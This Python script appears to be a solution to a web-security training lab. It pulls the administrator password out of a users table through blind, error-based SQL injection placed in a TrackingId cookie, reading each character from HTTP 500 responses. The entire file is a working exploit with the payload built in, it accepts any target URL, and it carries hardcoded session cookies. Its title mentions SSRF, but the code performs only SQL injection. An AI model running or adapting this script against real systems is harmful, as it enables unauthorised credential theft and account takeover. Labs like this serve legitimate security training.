# Lab: Blind SSRF SQLi by triggering conditional errors
import os
import sys
import urllib.parse
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")}


def get_admin_password(url):
    password = " "
    for i in range(1, 21):
        middleChar = (126 + 32) / 2
        sqli_payload = "' || (select case WHEN (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and ascii(substr(password,%s,1)) > '%s') || '" % (i, middleChar)
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies = {'TrackingId': 'WD99eMFyrjvQ0Yc1' + sqli_payload_encoded,
                   'session': 'yn0lQkfYfGkzOx27NRrOUSzgbUwjC7yi'}
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 500:
            for j in range(int(middleChar), 126):
                sqli_payload = "' || (select case WHEN (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i, j)
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)

                cookies = {'TrackingId': 'WD99eMFyrjvQ0Yc1' + sqli_payload_encoded,
                           'session': 'yn0lQkfYfGkzOx27NRrOUSzgbUwjC7yi'}
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if r.status_code == 500:
                    password += chr(j)
                    sys.stdout.write('\r' + password)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password + chr(j))
                    sys.stdout.flush()
        else:
            for j in range(32, int(middleChar) + 1):
                sqli_payload = "' || (select case WHEN (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i, j)
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)

                cookies = {'TrackingId': 'WD99eMFyrjvQ0Yc1' + sqli_payload_encoded,
                           'session': 'yn0lQkfYfGkzOx27NRrOUSzgbUwjC7yi'}
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if r.status_code == 500:
                    password += chr(j)
                    sys.stdout.write('\r' + password)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password + chr(j))
                    sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    get_admin_password(url)


if __name__ == "__main__":
    main()
